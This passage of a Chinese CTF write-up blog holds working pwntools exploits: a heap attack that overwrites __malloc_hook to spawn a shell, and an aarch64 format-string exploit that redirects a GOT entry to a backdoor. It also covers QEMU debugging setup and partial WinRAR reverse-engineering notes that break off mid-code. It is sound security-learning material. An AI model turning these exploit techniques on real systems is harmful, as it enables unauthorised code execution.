punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33747</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1b8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c4b61</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x148</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x148</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h3><p>漏洞点是格式化字符串，并且存在后门，限制了输入内容不能包含<code>$</code>，但还是可以直接用<code>fmtstr_payload</code>工具</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// x19</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [xsp+FCCh] [xbp+2Ch]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [xsp+FD0h] [xbp+30h] BYREF</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [xsp+FF8h] [xbp+58h]</span>  v7 <span class="token operator">=</span> _bss_start<span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"$"</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试出偏移是<code>14</code>，开了<code>canary</code>保护，所以可以将<code>__stack_chk_fail_got</code>改成<code>backdoor</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-aarch64 <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn        aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0x7f3e313a1400-0x2d70252d70252d70-0xa7025-0x7f3e313a1448-<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>-0x8080808080-0x2c6f242c6f242c6f-0x7f3e313a13e0-0x7f3e30a48a00-0x400888-0x4008c0-0x7f3e313a13e0-0x4b30a489ac-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'120.79.91.95'</span><span class="token punctuation">,</span> <span class="token number">3332</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">0x411018</span><span class="token punctuation">:</span><span class="token number">0x400770</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><h4 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#必要环境</span><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">make</span> ninja-build pkg-config libglib2.0-dev bison flex<span class="token comment">#安装qemu</span><span class="token function">wget</span> https://download.qemu.org/qemu-9.0.1.tar.xz<span class="token function">tar</span> xvJf qemu-9.0.1.tar.xz<span class="token builtin class-name">cd</span> qemu-9.0.1./configure<span class="token function">make</span> <span class="token parameter variable">-j8</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h4><p><code>-g</code>指定端口，<code>-L</code>指定动态链接库，静态链接的程序无需该参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-aarch64 <span class="token parameter variable">-g</span> <span class="token number">1234</span> <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-q</span> ./pwn<span class="token builtin class-name">set</span> architecture aarch64<span class="token builtin class-name">set</span> endian littleadd-symbol-file ./libc/libc/lib/libc-2.21.so<span class="token comment">#连接到正在运行的pwn，端口为qemu指定的端口</span>target remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="脚本调试"><a href="#脚本调试" class="headerlink" title="脚本调试"></a>脚本调试</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="7-17-7-22"><a href="#7-17-7-22" class="headerlink" title="#7-17-#7.22"></a>#7-17-#7.22</h2><p>电脑祭天…之前在干啥我也不记得了，记录一下电脑祭天前逆的<code>WinRar</code>吧</p><h3 id="释放到临时目录"><a href="#释放到临时目录" class="headerlink" title="释放到临时目录"></a>释放到临时目录</h3><p><code>sub_1400EF508</code>函数：</p><ul><li><p><code>result = sub_1400E7F34(L&quot;Rar$DI&quot;, v19, 2048i64, a4);</code> 在Temp目录创建了临时目录<code>Rar$DIa19832.13485</code>（<code>DIa</code>后面的数字随机）</p></li><li><p><code>sub_1400097E8(&amp;unk_1401BA630, &amp;szShortPath, 2048i64);</code> 获取打开的压缩包所在文件路径到<code>szShortPath</code></p></li><li><p><code>sub_140009290(&amp;unk_1401BA630, 0i64, 0i64);</code>将文件释放到临时目录</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_140009290</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>byte_14018A806 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_1401A25E8 <span class="token punctuation">)</span>      <span class="token function">sub_14000A650</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token function">sub_14000A5A4</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>sub_1400EF508<span class="token operator">-></span>sub_140009290<span class="token operator">-></span>sub_14000A650__int64 __fastcall <span class="token function">sub_14000A650</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span>i64 <span class="token operator">*</span> dword_1401A4928 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">56</span>i64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过<code>return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 56i64))(v1);</code> 跳转到<code>sub_1400D6070</code> 开始遍历<code>szShortPath</code>路径文件下的所有文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x1400D6070</span>__int64 <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">set_start_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">8</span>i64<span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">call_cmp_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cmp</code>调用<code>set_start_pos()</code> 函数创建一块区域存放压缩包中的所有文件名</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x1400D6478</span>__int64 <span class="token function">set_start_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  start_pos <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">j__malloc_base</span><span class="token punctuation">(</span><span class="token number">0x2004u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cmp</code>调用<code>call_cmp_name</code> 函数开始遍历文件名到deFileName并且与点击的文件名click_name比较</p><p><code>call_cmp_name</code>函数调用<code>write_filenames</code>函数向<code>start_pos</code>区域中写压缩包中的所有文件，再调用<code>cmp_name_1</code>进一步比较</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x1400D3474</span>__int64 <span class="token function">call_cmp_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  v0 <span class="token operator">=</span> <span class="token function">write_filenames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">cmp_name_1</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cmp_name_1</code>循环遍历<code>start_pos</code>区域中的所有文件名并且调用<code>cmp_name_2</code> 继续比较</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x1400CEBF4</span>__int64 __fastcall <span class="token function">cmp_name_1</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_1400AE9EC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">64</span> <span class="token operator">||</span> byte_1401EA658 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">cmp_name_2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_14019B530<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v117<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v20<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_69<span class="token punctuation">;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续套…<code>cmp_name_2</code> 获取了deFileName和click_name并且调用了<code>compare</code>函数进行最终的比较，其中click_name是在<code>获取点击的文件</code> 部分获取的，放到后面分析</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x140077054</span>__int64 __fastcall <span class="token function">cmp_name_2</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> bool <span class="token operator">*</span>a3<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> <span class="token keyword">char</span> a5<span class="token punctuation">,</span> _WORD <span class="token operator">*</span>a6<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a7<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token 